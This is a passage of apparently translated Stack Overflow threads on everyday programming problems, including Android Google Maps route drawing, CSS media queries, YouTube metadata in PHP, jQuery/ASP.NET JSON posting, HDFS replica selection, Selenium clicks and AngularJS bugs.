     public String getName() {
         return name;
     }

     /**
      * @param copyright the copyright to set
      */
     public void setCopyright(String copyright) {
         this.copyright = copyright;
     }

     /**
      * @return the copyright
      */
     public String getCopyright() {
         return copyright;
     }

     /**
      * @param warning the warning to set
      */
     public void setWarning(String warning) {
         this.warning = warning;
     }

     /**
      * @return the warning
      */
     public String getWarning() {
         return warning;
     }

     /**
      * @param country the country to set
      */
     public void setCountry(String country) {
         this.country = country;
     }

     /**
      * @return the country
      */
     public String getCountry() {
         return country;
     }

     /**
      * @param length the length to set
      */
     public void setLength(int length) {
         this.length = length;
     }

     /**
      * @return the length
      */
     public int getLength() {
         return length;
     }

     /**
      * @param polyline the polyline to set
      */
     public void setPolyline(String polyline) {
         this.polyline = polyline;
     }

     /**
      * @return the polyline
      */
     public String getPolyline() {
         return polyline;
     }

} 
```

部分：

```
public class Segment {
    /** Points in this segment. **/
    private LatLng start;
    /** Turn instruction to reach next segment. **/
    private String instruction;
    /** Length of segment. **/
    private int length;
    /** Distance covered. **/
    private double distance;

    /**
     * Create an empty segment.
     */

    public Segment() {
    }

    /**
     * Set the turn instruction.
     * @param turn Turn instruction string.
     */

    public void setInstruction(final String turn) {
            this.instruction = turn;
    }

    /**
     * Get the turn instruction to reach next segment.
     * @return a String of the turn instruction.
     */

    public String getInstruction() {
            return instruction;
    }

    /**
     * Add a point to this segment.
     * @param point LatLng to add.
     */

    public void setPoint(LatLng point) {
            start = point;
    }

    /** Get the starting point of this 
     * segment.
     * @return a LatLng
     */

    public LatLng startPoint() {
            return start;
    }

    /** Creates a segment which is a copy of this one.
     * @return a Segment that is a copy of this one.
     */

    public Segment copy() {
            final Segment copy = new Segment();
            copy.start = start;
            copy.instruction = instruction;
            copy.length = length;
            copy.distance = distance;
            return copy;
    }

    /**
     * @param length the length to set
     */
    public void setLength(final int length) {
            this.length = length;
    }

    /**
     * @return the length
     */
    public int getLength() {
            return length;
    }

    /**
     * @param distance the distance to set
     */
    public void setDistance(double distance) {
            this.distance = distance;
    }

    /**
     * @return the distance
     */
    public double getDistance() {
            return distance;
    }

} 
```

我的 MainActivity（由于用户本地化，有 326 行代码，你可以在 google 开发者网站上找到它，所以我们可以假设有两个静态点 A 和 B，我想从 A 到 B）：

```
public class MainActivity extends FragmentActivity{
    private GoogleMap map;
    private Marker currentLocation;
    private PolylineOptions pathLine;
    private LatLng imhere = new LatLng(41.8549038,12.4618208);
        private LatLng poi = new LatLng(41.89000,12.49324);

    private LocationManager mLocationManager;
    private Handler mHandler;
    private boolean mUseBoth;
    private Context context;
    // Keys for maintaining UI states after rotation.
    private static final String KEY_BOTH = "use_both";
    // UI handler codes.
    private static final int UPDATE_LATLNG = 2;

    private static final int FIVE_SECONDS = 5000;
    private static final int THREE_METERS = 3;
    private static final int TWO_MINUTES = 1000 * 60 * 2;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        map = ((SupportMapFragment) getSupportFragmentManager().findFragmentById(R.id.map)).getMap();
        Marker colosseoMarker  = map.addMarker(new MarkerOptions()
        .position(colosseo)
        .title("Start")
        .snippet("poi")
        .icon(BitmapDescriptorFactory.fromResource(R.drawable.ic_launcher)));

                Marker current pos = map.addMarker(new MarkerOptions()
        .position(imhere)
        .title("i'm here")
        .snippet("here!")
        .icon(BitmapDescriptorFactory.fromResource(R.drawable.ic_launcher)));

        context =this ;
        map.setOnMarkerClickListener(new OnMarkerClickListener() {

            @Override
            public boolean onMarkerClick(Marker marker) {
                final String[] options = {"Calcola il Percorso"};
                AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
                builder.setTitle("Ottieni Informazioni aggiuntive");
                builder.setPositiveButton("Calcola Percorso",new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialog,int id) {
                        LatLng start = new LatLng(imhere.latitude,imhere.longitude);
                        LatLng dest = new LatLng(poi.latitude, poi.longitude);
                        Route route = drawPath(start, dest);

                        List<LatLng> list= route.getPoints();

if(pathLine!= null) pathline =null;                         
pathLine = new PolylineOptions();

                        pathLine.addAll(list);
                        pathLine.color(Color.rgb(0,191,255));

                        map.addPolyline(pathLine);

                    }
                  });

                AlertDialog alert = builder.create();
                alert.show();
                Toast.makeText(MainActivity.this, marker.getSnippet(),Toast.LENGTH_SHORT).show();
                return true;
            }
        });

                    map.animateCamera(CameraUpdateFactory.newLatLngZoom(imhere, 12));
                }
            }
        };
        // Get a reference to the LocationManager object.
        mLocationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
    }

     private Route drawPath(LatLng start, LatLng dest) {
            Parser parser;
            String jsonURL = "http://maps.google.com/maps/api/directions/json?";
            final StringBuffer sBuf = new StringBuffer(jsonURL);
            sBuf.append("origin=");
            sBuf.append(start.latitude);
            sBuf.append(',');
            sBuf.append(start.longitude);
            sBuf.append("&destination=");
            sBuf.append(dest.latitude);
            sBuf.append(',');
            sBuf.append(dest.longitude);
            sBuf.append("&sensor=true&mode=walking");
            parser = new JsonParser(sBuf.toString());
            Route r =  parser.parse();
            return r;
        }
} 
```

每个建议都被很好地接受

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-07-15T23:09:36.367

如果您不需要自定义代码，请尝试此库[https://github.com/jd-alexander/Google-Directions-Android](https://github.com/jd-alexander/Google-Directions-Android)只需几行代码即可完成您需要的操作。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2017-03-29T09:28:25.327

我正在做以下事情。我想这会对你有所帮助。

```
 Marker interestedMarker;
    private void plot_direction(){
        if (currentSelectedPin !=null) {
            LatLng origin = new LatLng(currentLocation.getLatitude(),currentLocation.getLongitude());
            new GoogleMapDirection(getActivity(), origin, interestedMarker.getPosition(), new DirectionListener() {
                @Override
                public void onDirectionPointsReceived(ArrayList<RouteModel> routeList, String distance, String duration) {
                    PolylineOptions lineOptions = null;
                    for (RouteModel route : routeList) {
                        lineOptions = new PolylineOptions();
                        lineOptions.addAll(route.getSteps());
                        lineOptions.width(20);
                        lineOptions.color(ContextCompat.getColor(getContext(), R.color.map_route));
                    }

                    //For removing existing line
                    if (routeMap!=null){
                        routeMap.remove();
                    }
                    if(lineOptions != null) {
                        routeMap = mMap.addPolyline(lineOptions);
                    }
                }
            });
        }
    } 
```

GoogleMapDirection 类如下

```
public class GoogleMapDirection {
    private DirectionListener listener;
    public GoogleMapDirection(final Activity activity, LatLng source, LatLng destination, DirectionListener listener){
        this.listener=listener;
        String url = null;
        try {
            url = "https://maps.googleapis.com/maps/api/directions/json?origin="+ URLEncoder.encode(Double.toString(source.latitude) + "," + Double.toString(source.longitude), "UTF-8") + "&destination=" + URLEncoder.encode(Double.toString(destination.latitude) + "," + Double.toString(destination.longitude), "UTF-8") + "&mode=driving&sensor=false&key=" + Config.GOOGLE_API_BROWSER_KEY;
            Print.d(url);
        } catch (UnsupportedEncodingException e) {
            Print.exception(e);
        }

        JSONObject parameters = new JSONObject();
        VolleyJsonBodyRequest.execute(activity, url, parameters, new VolleyResponseListener() {
            @Override
            public void onResponse(JSONObject response) {
                try {
                    if (response.getString("status").equals("OK")) {
                        String distance = "NA";
                        String duration = "NA";
                        if (response.has("routes")){
                            JSONArray routesJArray = response.getJSONArray("routes");
                            if (routesJArray.length()>0){
                                if (routesJArray.getJSONObject(0).has("legs")){
                                    JSONArray legsJArray = routesJArray.getJSONObject(0).getJSONArray("legs");
                                    if (legsJArray.length()>0){
                                        JSONObject firstLegsJObj = legsJArray.getJSONObject(0);
                                        if (firstLegsJObj.has("distance")){
                                            distance = firstLegsJObj.getJSONObject("distance").getString("text");
                                        }
                                        if (firstLegsJObj.has("duration")){
                                            duration = firstLegsJObj.getJSONObject("duration").getString("text");
                                        }

                                    }
                                }
                            }
                        }
                        GoogleResponseParserTask task = new GoogleResponseParserTask(distance,duration);
                        task.execute(response);
                    }
                } catch (JSONException e) {
                    Print.exception(e);
                    DialogWindow.showOK(activity, Config.MESSAGE_INVALID_RESPONSE_FORMAT, new DialogListenerOK() {
                        @Override
                        public void onOK() {

                        }
                    });
                }
            }
            @Override
            public void onErrorResponse(VolleyResponseError error) {
                Print.e(error.getDetails());
                DialogWindow.showOK(activity, error.getMessage(), new DialogListenerOK() {
                    @Override
                    public void onOK() {

                    }
                });
            }
        });
    }

    /**
     * A class to parse the Google Places in JSON format
     */
    private class GoogleResponseParserTask extends AsyncTask<JSONObject, Integer, ArrayList<RouteModel>> {

        String distance;
        String duration;
        private GoogleResponseParserTask(String distance, String duration){
            this.distance=distance;
            this.duration=duration;

        }
        @Override
        protected ArrayList<RouteModel> doInBackground(JSONObject... jsonResponse) {
            ArrayList<RouteModel> routes = null;
            try {
                routes = parse(jsonResponse[0]);
            } catch (Exception e) {
                Print.exception(e);
            }
            return routes;
        }
        @Override
        protected void onPostExecute(ArrayList<RouteModel> result) {
            listener.onDirectionPointsReceived(result,distance,duration);
        }
    }

    /** Receives a JSONObject and returns a list of lists containing latitude and longitude */
    public ArrayList<RouteModel> parse(JSONObject jObject){

        ArrayList<RouteModel> routeList = new ArrayList<>() ;
        JSONArray jRoutes;
        JSONArray jLegs;
        JSONArray jSteps;

        try {

            jRoutes = jObject.getJSONArray("routes");

            /** Traversing all routes */
            for(int i=0;i<jRoutes.length();i++){
                jLegs = ( (JSONObject)jRoutes.get(i)).getJSONArray("legs");
                ArrayList<LatLng> pointList = new ArrayList<>();

                /** Traversing all legs */
                for(int j=0;j<jLegs.length();j++){
                    jSteps = ((JSONObject)jLegs.get(j)).getJSONArray("steps");
                    JSONObject jDistance = ((JSONObject) jLegs.get(j)).getJSONObject("distance");
                    JSONObject jDuration = ((JSONObject) jLegs.get(j)).getJSONObject("duration");

                    String distance = jDistance.getString("text");
                    String duration = jDuration.getString("text");

                    /** Traversing all steps */
                    for(int k=0;k<jSteps.length();k++){
                        String polyline = (String)((JSONObject)((JSONObject)jSteps.get(k)).get("polyline")).get("points");
                        ArrayList<LatLng> stepList = decodePoly(polyline);

                        /** Traversing all points */
                        for(int l=0;l<stepList.size();l++){
                            LatLng point = new LatLng((stepList.get(l)).latitude, (stepList.get(l)).longitude);
                            pointList.add(point);
                        }
                    }
                    RouteModel routeModel = new RouteModel();
                    routeModel.setSteps(pointList);
                    routeModel.setDistance(distance);
                    routeModel.setDuration(duration);
                    routeList.add(routeModel);
                }
            }

        } catch (JSONException e) {
            e.printStackTrace();
        }catch (Exception e){
        }

        return routeList;
    }

    /**
     * Method to decode polyline points
     * Courtesy : http://jeffreysambells.com/2010/05/27/decoding-polylines-from-google-maps-direction-api-with-java
     * */
    private ArrayList<LatLng> decodePoly(String encoded) {

        ArrayList<LatLng> poly = new ArrayList<>();
        int index = 0, len = encoded.length();
        int lat = 0, lng = 0;

        while (index < len) {
            int b, shift = 0, result = 0;
            do {
                b = encoded.charAt(index++) - 63;
                result |= (b & 0x1f) << shift;
                shift += 5;
            } while (b >= 0x20);
            int dlat = ((result & 1) != 0 ? ~(result >> 1) : (result >> 1));
            lat += dlat;

            shift = 0;
            result = 0;
            do {
                b = encoded.charAt(index++) - 63;
                result |= (b & 0x1f) << shift;
                shift += 5;
            } while (b >= 0x20);
            int dlng = ((result & 1) != 0 ? ~(result >> 1) : (result >> 1));
            lng += dlng;

            LatLng p = new LatLng((((double) lat / 1E5)),
                    (((double) lng / 1E5)));
            poly.add(p);
        }

        return poly;
    } 
```

# css - 当用户减小窗口大小时，如何使 div 相互堆叠？

> ID：13916681
> 
> 赞同：0
> 
> 时间：2012-12-17T15:09:19.433
> 
> 标签：css, fluid-layout

对于[Bootstrap 网站](http://twitter.github.com/bootstrap/scaffolding.html)上的示例 Ctrl +F "Nesting Columns"。由于窗口足够宽，2 级柱子彼此相邻，但减小了尺寸，因此它们不再适合它们，它们很好地贴合在一起。我怎样才能做到这一点？

我有一个几乎相同的布局，除了我有几个 div 堆叠和 1 个侧边栏浮动到右侧。像这样的东西：

```
<div id="container">  //Width: 96%; margin: auto; max-width: 870px; 
  <div id="sidebar">Sidebar</div>  //Floated to the right and "width: 26%;"
  <div id="box1">Box 1</div>  //Width: 68%; for every box# id
  <div id="box2">Box 2</div>
  <div id="box3">Box 3</div>
</div> 
```

我可以随意将它挤在一起，一切正常，但是随着窗口宽度的减小，我希望边栏像引导示例中那样堆叠在盒子 div 的顶部。如果我减小窗口的宽度，侧边栏会出现在 div 的顶部，但它仍然浮动到右侧并且看起来很破碎。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-17T15:11:15.387

您想要的可能是媒体查询。

[http://www.w3.org/TR/css3-mediaqueries/](http://www.w3.org/TR/css3-mediaqueries/)

例如

```
@media screen and (max-width: 768px) {
    // insert css rules here
} 
```

使用上面的 CSS 代码，您可以为分辨率为 768 像素或以下的设备设置您想要的 CSS 规则。

# php - 从 youtube 音乐视频中提取歌曲和艺术家

> ID：13916683
> 
> 赞同：1
> 
> 时间：2012-12-17T15:09:24.530
> 
> 标签：php, youtube-api

我正在制作一个网站，您可以从 youtube 搜索或音乐视频并在网站上播放它们。有一个问题。我无法正确地从 youtube 中提取歌曲和艺术家。我做了这个功能：

```
$watch = $_GET['var'];
//id of the video
$code = $watch;
// Get video feed info (xml) from youtube, but only the title | http://php.net/manual/en/function.file-get-contents.php
$video_feed = file_get_contents("http://gdata.youtube.com/feeds/api/videos?v=2&q=".$code."&max-results=1&fields=entry(title)&prettyprint=true");
// xml to object | http://php.net/manual/en/function.simplexml-load-string.php
$video_obj = simplexml_load_string($video_feed);
// Get the title string to a variable
$video_str = $video_obj->entry->title;
// Output
echo "<br/>\n";
$new =  explode("-", $video_str); 
```

`$watch`是 youtube 视频 ID。youtube上的官方音乐视频是这样的。`"eminem - without me"` 我能得到这首歌和艺术家的唯一方法就是这样。但是对于音乐视频，格式是不同的。标题中没有“ - ”，所以我无法从 youtube 中提取我需要的信息。我想知道是否有其他方法可以做到这一点。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-03T20:18:21.753

您始终可以通过处理原始 xml 来提取艺术家

```
http://gdata.youtube.com/feeds/api/videos/{$videoId} 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-12-17T15:21:36.137

我不确定 YT 是否通过 API公开[艺术家信息。](https://groups.google.com/forum/?fromgroups=#!topic/youtube-api-gdata/wNb6JLJteyU)我对解决此问题的最佳猜测是拥有一个不同的艺术家数据库，然后匹配标题或其他元数据项以提取艺术家。

您需要一些机制来维护和更新艺术家数据库并将视频与之相关联。

# c# - 从 asp.net 网页中的 jQuery Ajax 调用中检索 JSON 数组

> ID：13916689
> 
> 赞同：2
> 
> 时间：2012-12-17T15:09:41.807
> 
> 标签：c#, jquery, asp.net, json, webmatrix

我正在尝试通过 jQuery 的 ajax 调用发送一些数据。我的问题是：**如何在我的`Insert.cshtml`文件中获取这个 JSON 数组？**我尝试过`Request["rows"]`,`Request[0][rows]`等，但没有任何成功。

在这里，我要发送的数据是这样的（多行表单数据）：

```
[
    {
        "sl": "1",
        "tname": "Gardening",
        "ttype": "4",
        "tduration": "12"
    },
    {
        "sl": "2",
        "tname": "Nursing",
        "ttype": "4",
        "tduration": "45"
    }
] 
```

jQuery代码：

```
$.ajax({
    type: "POST",
    url: "/Insert",
    data: rows,
    contentType: "application/json",
    success: function (data, status) {
        alert(status);
    },
    error: function (xhr, textStatus, error) {
        var errorMessage = error || xhr.statusText;
        alert(errorMessage);
    }
}); 
```

**更新：jsfiddle 中的部分演示**- [http://jsfiddle.net/rafi867/gprQs/8/](http://jsfiddle.net/rafi867/gprQs/8/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-18T13:39:54.497

我试图模拟您在 App_Code 中创建 Sample.cs 类的问题：

```
public class Sample
{
    public string sl { get; set; }
    public string tname { get; set; }
    public string ttype { get; set; }
    public string tduration { get; set; }
} 
```

现在您的 Insert.cshtml 文件应如下所示：

```
@{
    var sample = new Sample[]{
    new Sample{ sl = "1", tname = "Gardening", ttype = "4", tduration = "12" },
    new Sample{ sl = "2", tname = "Nursing", ttype = "4", tduration = "45" }
    };
    Json.Write(sample, Response.Output);
} 
```

保存 Sample 对象的文件（ReadSample.cshtml？）应该是：

```
<!DOCTYPE html>

<html lang="en">
    <head>
        <meta charset="utf-8" />
        <title></title>
        <script src="~/Scripts/jquery-1.4.2.min.js" type="text/javascript"></script>
        <script type="text/javascript">
            $.getJSON('/Insert', function (sample)
            {
                var custList = "";
                $.each(sample, function (index, obj) {
                        custList += "<li>" + obj.sl + " - " + obj.tname + 
                                " - " + obj.ttype + " - " + obj.tduration + "</li>";
                })
                $("#list").html("<ul>" + custList + "</ul>")
            })
        </script>
    </head>
    <body>
        <div id="list"></div>
    </body>
</html> 
```

在我的示例中，我已经阅读了 objects 数组

```
$.getJSON('/Insert', function (sample) 
```

并创建了一个无序列表来显示其内容

```
$.each(sample, function (index, obj) {
        custList += "<li>" + obj.sl + " - " + obj.tname + 
                " - " + obj.ttype + " - " + obj.tduration + "</li>";
})
$("#list").html("<ul>" + custList + "</ul>") 
```

我希望这会有所帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T16:12:51.190

我已经放了一个**示例代码**来展示如何使用 jquery 和 css 在网页上显示数组项。通过使用这个尝试理解这个概念，然后将它应用到你的场景中。

**HTML**

```
 <div class="dialog" id="unpaid-dialog" data-width="550" data-title="Checkout">
        <ul>
            <li id="serviceAndRetailDetails" style="text-align: left;"></li>
        </ul>
    </div> 
```

**jQuery**

```
<script type="text/javascript">

    var toBePaidItems = new Array();//create a array
    var make = "";

    $.ajax({
        type: "GET",
        url: "/Portal/GetServiceAndRetailSalesDetails",
        dataType: 'json',
        contentType: "application/json; charset=UTF-8",
        data: { invoiceOrSaleId: invoiceOrSaleId, providerKey: providerKey },
        success: function (response) {
            make = "<table id='tblPayment'>";
            toBePaidItems = [];

            $.each(response, function (index, sr) {

                make += "<tr id=" + sr.AllocationOrInvoiceOrSaleId + " class=" + sr.Class + ">" + "<td style='padding-right:100px'>" + sr.Name + "</td><td class='colTotal' style='padding-right:45px'>" + '$ ' + sr.Price.toFixed(2) + "</td><td></tr>";

                //insert into array
                toBePaidItems.push(sr.AllocationOrInvoiceOrSaleId);
            });

            make += "</table>";
            $("#serviceAndRetailDetails").html(make);
        }
    });

</script> 
```

**控制器动作方法**

```
[HttpGet]
public JsonResult GetServiceAndRetailSalesDetails(Guid invoiceOrSaleId, string providerKey)
        {

            var items = new List<CheckOutServiceAndRetailItem>();

            var serviceDetails = Repository.GetAllPayableItems(invoiceOrSaleId).ToList();

            foreach (var s in serviceDetails)
            {
                var item = new CheckOutServiceAndRetailItem
                {
                    AllocationOrInvoiceOrSaleId = s.Allocation.AllocationId,
                    Name = s.Allocation.Service.Name,
                    Price = s.LatestTotal,
                    Class = s.Allocation.Service.IsAnExtra,
                };
                items.Add(item);
            }

            return Json(items, JsonRequestBehavior.AllowGet);
        } 
```

**阵列输出**

![在此处输入图像描述](../Images/75e6b25d72472855cf7f50ca0a11d418.png)

如何在[**此处操作数组**](http://thejimgaudet.com/articles/support/web/jquery-arrays-create-add-to-remove-from-and-compare/)

希望这会对您有所帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-17T17:36:34.973

data 参数旨在将名称-值对映射到查询字符串参数，正如您可以从[文档](http://api.jquery.com/jQuery.ajax/)中得知的那样：

> **数据**
> 
> 要发送到服务器的数据。如果还不是字符串，则将其转换为查询字符串。它附加到 GET 请求的 url。请参阅 processData 选项以防止此自动处理。*对象必须是键/值对。*如果 value 是一个数组，jQuery 会根据传统设置的值（如下所述）序列化具有相同键的多个值。

如果您继续阅读该[`.param()`](http://api.jquery.com/jQuery.param/)方法的文档，这应该可以帮助您了解您的请求发生了什么以及 jQuery 如何将您的对象发送到服务器。

您可能只需要在对象中命名您的对象/数组，`data`以便您可以在对象中引用它们`Request.Forms`。

# hadoop - HDFS 如何知道我们从哪个主机获取文件

> ID：13916690
> 
> 赞同：0
> 
> 时间：2012-12-17T15:09:42.813
> 
> 标签：hadoop, hdfs

我使用命令行，我想知道从哪个主机获取文件（或获取哪个副本）。

通常它应该是离我最近的。但我改变了项目的政策。因此，我想检查最终结果，看看我的新策略是否正常工作。

以下命令未提供任何信息：

> hadoop dfs -get /文件

下一个只给了我副本的位置，而不是哪个更适合获取：

> hadoop fsck /file -files -blocks -locations

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-30T21:04:55.290

HDFS 将这些信息抽象出来，因为它对于用户知道他们从哪里读取不是很有用（文件系统被设计为尽可能少地使用您的方式）。通常，DFSClient 打算按照返回给它的主机的顺序来获取数据（在发生故障时转移到替代方案）。返回给它的主机由 NameNode 排序以获得适当的数据或机架位置 - 这就是默认方案的工作方式。

虽然您的问题的正确答案是编写可以模拟和断言的良好测试用例，但您也可以在 Hadoop 记录器设置为 DEBUG 的情况下运行您的程序，以检查与各种主机（包括 DN）建立的 IPC 连接何时阅读文件 - 并通过这些手动断言您的主机选择正在按预期工作。

另一种方法是通过调试器运行您的客户端并观察最终建立的连接周围的部分以检索数据（即在 NN RPC 之后）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T14:17:03.923

谢谢，

最后，我们使用网络统计数据和一个简单的测试用例来查找 hadoop 将副本带到哪里。

但最简单的方法是打印此方法修改的数组节点：

> org.apache.hadoop.net.NetworkTopology pseudoSortByDistance(Node reader, Node[] nodes)

正如我们所料，副本的获取是基于方法的结果。第一个项目是首选。除非节点出现错误，否则通常会采用第一项。有关此方法的详细信息，请参阅复制

# forms - 多步表单验证 Codeigniter

> ID：13916691
> 
> 赞同：1
> 
> 时间：2012-12-17T15:09:43.033
> 
> 标签：forms, codeigniter, validation, multi-step

是否可以在 Codeigniter 中运行多步表单验证，这样，当发现错误时，表单验证将停止（不验证其他表单验证规则）？

使用 Form_validation 类的 set_rules() 和 run() 方法，即使没有通过第一个规则，也会检查所有规则。

还是以特定顺序在我的模型中验证这些标准（这样它在验证错误时停止）并将单个错误消息传递给我的视图是否更好？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T19:47:16.123

拉尔夫，我不确定您是否可以使用标准 CI 验证库来做到这一点。您可能需要扩展/覆盖它以实现您想要的。您可以单独显示第一条错误消息，但会在后台运行完整的数据检查。根据您需要的数据验证的复杂程度，您还可以使用一些 jQuery 插件在提交表单之前粗略检查数据。这将降低发送不良数据的风险，并可能减少服务器端的开销。

# c# - Selenium Webdriver C#为什么我必须单击两次才能选择单选按钮

> ID：13916693
> 
> 赞同：0
> 
> 时间：2012-12-17T15:09:44.577
> 
> 标签：c#, selenium, webdriver, jradiobutton

Selenium Webdriver C#-为什么我必须单击两次才能选择单选按钮？这是代码：

```
weItem_TypeRadio = _driver.FindElement(By.CssSelector("input[name*='" 
                 + stcItemType 
                 + "'][value='HLP'][type='radio']")
                 , _stcintTimeoutInSeconds);
weItem_TypeRadio.Click(); // first click puts a dotted box around radio button
weItem_TypeRadio.Click(); // this click actually selects the radio button 
```

Webdriver v2.8 Asp.net 4.0 C#

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T15:40:59.947

理论上，您不必单击两次。实际上，IE 驱动程序对窗口焦点特别敏感，如果 IE 窗口始终不是前景的焦点窗口，就会发生这种情况。有一篇[博客文章](http://jimevansmusic.blogspot.com/2012/06/whats-wrong-with-internet-explorer.html)讨论了如何在 IE 驱动程序中执行点击（使用所谓的“本机事件”）以及使用它们的后果。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T16:36:26.570

在 Selenium WebDriver 中使用 Java 选择单选按钮的代码，

我尝试在 IE 浏览器中单击表跨度内的单选按钮，我几乎没有找到解决方案，最终使用 Click 的双重语句作为 IE 驱动程序对窗口非常敏感，它首先在带有 First Click 语句的单选按钮周围给出“点”并再次使用相同的语句（单击）成功选择它。

```
WebDriver WD1;
WD1.findElement(By.id("singles_out_tickets")).click();
WD1.findElement(By.id("singles_out_tickets")).click(); 
```

# angularjs - 在 ngView 中动态添加新的表单字段 - Angularjs

> ID：13916694
> 
> 赞同：2
> 
> 时间：2012-12-17T15:09:51.473
> 
> 标签：angularjs

我使用路由将不同的模板加载到 ngView 中。其中一个模板有一个简单的控制器，其中包含一组联系人。我在这里尝试做的很简单，只需单击一个链接 (ngclick) 调用一个函数并将一个新对象添加到我希望在我的 UI 中反映的数组中。

是这样的：

```
$scope.contacts = [{name='', email=''}];

<li ng-repeat="con in contacts">
  <input type="text" ng-model="con.name"/>
  <input type="email" ng-model="con.email"/> 
</li>
<li>
  <a href ng-click="addContact()">add</a>
</li>

$scope.addContact = function() {
  $scope.contacts.push( {name='', email=''} ); //-- i can use either $scope or this to reference the array and works.
} 
```

因此，UI 以初始值呈现良好，点击时调用 addContact 函数，我看到值被推送（长度 = 2），但函数结束后，数组似乎重置为一个元素（长度 = 1） angularjs 评估。

我不确定这是否发生，因为我使用 ngView。我的意思是，我查看了这个示例（http://code.angularjs.org/1.0.3/docs/api/ng.directive:ngController），我没有看到我在这里尝试做的事情有什么不同，不同之处在于我将路由与 ngView 一起使用。

小提琴：http: [//jsfiddle.net/fdDph/](http://jsfiddle.net/fdDph/)

非常感谢您的帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-19T04:32:24.603

在您的小提琴中，您在 ng-show 中将数组长度重置为 1：

```
<span ng-hide="contacts.length = 1"> 
```

这样做，它将起作用：

```
<span ng-hide="contacts.length == 1"> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-18T19:28:53.150

`{name='', email=''}`顺便说一句，语法错误，应该是`{name:'', email:''}`

# javascript - 暂停页面执行，直到加载脚本

> ID：13916698
> 
> 赞同：0
> 
> 时间：2012-12-17T15:09:59.227
> 
> 标签：javascript, jquery, ajax

我已经被这段代码困住了几天，我想延迟 targetObj.innerHTML 的执行，直到所有的 javascript 文件都被加载（可能有多个，我实际上需要检查它们是否被加载而不是添加的标题），提前谢谢你们！

```
function addScriptTag(src) {
    var newScript;
    var loadFunc = function ()
    {
        $.holdReady(false);
    };
    newScript = document.createElement('script');
    newScript.setAttribute('type','text/javascript');
    newScript.setAttribute('src',src);

    //Other browsers trigger this one
    if (newScript.addEventListener)
    newScript.addEventListener('load', loadFunc, false);

    document.getElementsByTagName('head')[0].appendChild(newScript);
}

function parseScript(_source) {
    var source = _source;
    var scripts = source.match(/<script[^>]*src=[^>]*>/g);
    if (scripts) {
    for (var i = 0; i < scripts.length; i++) {
        src = scripts[i].match(/src=("([^"]*)"|'([^']*)')/);
        src = src[2] || src[3];
        if (src) {
            addScriptTag(src);
        }
    }
    }
    var scripts = new Array();

    return source;
}

function ajax_showContent(divId,ajaxIndex,url,callbackOnComplete)
{
        $.holdReady(true);
    var targetObj = document.getElementById(divId);
    targetObj.innerHTML = parseScript(dynamicContent_ajaxObjects[ajaxIndex].response); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T15:20:06.907

如果您想异步加载脚本依赖项，我会考虑使用像[RequireJS](http://requirejs.org/)这样的 AMD 库。它将检查所有脚本是否已加载，并允许您在回调中执行 yoru 代码。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T15:34:53.727

这将是一些变化，但您可能正在查看的是递归 setTimeout 循环。代替设置，向该设置`targetObj.innerHTML = ...`发送回调。然后，在 中，有一个函数每 10 毫秒递归调用一次，使用.`parseScript``targetObj.innerHTML``parseScript``window.setTimeout`

每次调用此内部函数都会检查您的脚本是否已执行。（也许通过拥有一个保存要执行的脚本计数的全局变量，并从每个 addScriptTag > loadFunc 中减去。一旦达到 0，您就已经执行了所有脚本。）如果它们尚未执行，则函数只是在 window.setTimeout 内再次调用自己。如果有，则执行您的回调 - 将所需的值传回给它。

像这样的东西（未经测试）：

```
(function() {
    var scriptCount = 0;

    function addScriptTag(src) {
        var newScript;
        var loadFunc = function() {
            scriptCount--;
            $.holdReady(false);
        };
        newScript = document.createElement('script');
        newScript.setAttribute('type', 'text/javascript');
        newScript.setAttribute('src', src);

        //Other browsers trigger this one
        if (newScript.addEventListener) newScript.addEventListener('load', loadFunc, false);

        document.getElementsByTagName('head')[0].appendChild(newScript);
    }

    function parseScript(_source, callback) {
        var source = _source;
        var scripts = source.match(/<script[^>]*src=[^>]*>/g);
        if (scripts) {
            scriptCount = scripts.length;
            for (var i = 0; i < scripts.length; i++) {
                src = scripts[i].match(/src=("([^"]*)"|'([^']*)')/);
                src = src[2] || src[3];
                if (src) {
                    addScriptTag(src);
                }
            }
            var wait = function() {
                scriptCount > 0 ? window.setTimeout(wait, 10) : callback(source);
            };
        }
        else {
            callback("");
        }
        var scripts = new Array();

        return source;
    }

    function ajax_showContent(divId, ajaxIndex, url, callbackOnComplete) {
        $.holdReady(true);
        var targetObj = document.getElementById(divId);
        parseScript(
        dynamicContent_ajaxObjects[ajaxIndex].response, function(value) {
            targetObj.innerHTML = value;
        });
    }
})(); 
```

...但是，正如所指出的，还有像 require.js 这样的其他库可能会为您做这种事情。另外，我不确定`source`您是否真的想在这里返回，因此可能需要进行一些修改。

# c# - 是否可以从内部更改对象的类型

> ID：13916699
> 
> 赞同：0
> 
> 时间：2012-12-17T15:10:02.423
> 
> 标签：c#, .net, types, casting

我有一个正方形和三角形作为继承类的形状类

```
Square square = new Square();
square.SideCount = 4;
//Logic
square.SideCount = 3;

if(square is Triangle)
   {
   //... 
```

如果我用 SideCount = 4 实例化一个新正方形，那么如果我将它的 SideCount 更改为 3，如果边设置为 3，我可以将代码放入 SideCount 的 Setter 以将 Square 转换为 Triangle 吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-17T15:14:03.043

不是直接不，`Square`不能将 的实例更改为 的实例`Triangle`。
